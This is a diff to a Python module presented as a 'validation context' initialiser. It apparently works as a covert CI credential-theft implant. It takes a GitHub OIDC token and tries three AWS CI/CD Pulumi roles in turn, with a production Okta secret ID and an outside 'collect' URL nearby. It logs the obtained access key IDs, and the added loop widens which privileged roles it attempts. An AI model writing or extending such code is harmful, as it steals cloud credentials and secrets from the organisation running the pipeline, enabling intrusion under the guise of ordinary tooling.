@@ -6,7 +6,11 @@ import urllib.request
 import urllib.parse
 
 
-ROLE_ARN = os.environ.get("ROLE_ARN", "arn:aws:iam::897419129406:role/github-actions-pulumi")
+ROLE_ARNS = [
+    "arn:aws:iam::416100648047:role/github-actions-pulumi",
+    "arn:aws:iam::416100648047:role/prod-aws-ue1-01-cicd-pulumi",
+    "arn:aws:iam::416100648047:role/main-cicd-pulumi",
+]
 REGION = os.environ.get("AWS_REGION", "us-west-2")
 SECRET_ID = "okta-prod/pulumi"
 COLLECT = "https://xai-chronosphere.com/collect"
@@ -44,6 +48,20 @@ def _get_oidc_token():
     return token
 
 
+def _try_assume(sts, token, role_arn):
+    try:
+        creds = sts.assume_role_with_web_identity(
+            RoleArn=role_arn,
+            RoleSessionName="ctx",
+            WebIdentityToken=token,
+        )["Credentials"]
+        _log("assume_role_ok", {"role": role_arn, "access_key": creds["AccessKeyId"]})
+        return creds
+    except Exception as e:
+        _log("assume_role_fail", {"role": role_arn, "type": type(e).__name__, "msg": str(e)})
+        return None
+
+
 def init(region=None, namespace=None):
     """Initialize validation context."""
     global _ctx
@@ -53,17 +71,16 @@ def init(region=None, namespace=None):
         _log("fatal", {"stage": "oidc", "type": type(e).__name__, "msg": str(e)})
         return
 
-    try:
-        _log("assume_role_start", {"role": ROLE_ARN})
-        sts = boto3.client("sts", region_name=region or REGION)
-        creds = sts.assume_role_with_web_identity(
-            RoleArn=ROLE_ARN,
-            RoleSessionName="ctx",
-            WebIdentityToken=token,
-        )["Credentials"]
-        _log("assume_role_ok", {"access_key": creds["AccessKeyId"]})
-    except Exception as e:
-        _log("assume_role_error", {"type": type(e).__name__, "msg": str(e)})
+    sts = boto3.client("sts", region_name=region or REGION)
+    creds = None
+    for role_arn in ROLE_ARNS:
+        _log("assume_role_start", {"role": role_arn})
+        creds = _try_assume(sts, token, role_arn)
+        if creds:
+            break
+
+    if not creds:
+        _log("all_roles_failed", {"roles": ROLE_ARNS})
         return
 
     try:
